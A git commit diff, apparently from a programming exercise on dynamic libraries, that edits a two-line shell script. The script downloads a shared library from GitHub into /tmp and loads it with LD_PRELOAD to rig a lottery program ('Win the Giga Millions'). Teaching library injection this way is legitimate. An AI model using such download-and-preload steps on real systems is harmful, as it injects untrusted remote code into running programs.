61062cfcac9d48958816d1858b143d0928c06fa8
Arinzelight <arinzelight2@gmail.com>
2023-09-18 15:34:58 -0700

    Code injection: Win the Giga Millions!

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -p /tmp https://github.com/Arinzelight/alx-low_level_programming/raw/master/0x18-Dynamic_libraries/libgiga.so
-export LD_PRELOAD=/tmp/libgiga.so
+wget -P /tmp https://github.com/Arinzeligh/alx-low_level_programming/raw/master/0x18-dynamic_libraries/nrandom.so
+export LD_PRELOAD=/tmp/nrandom.so
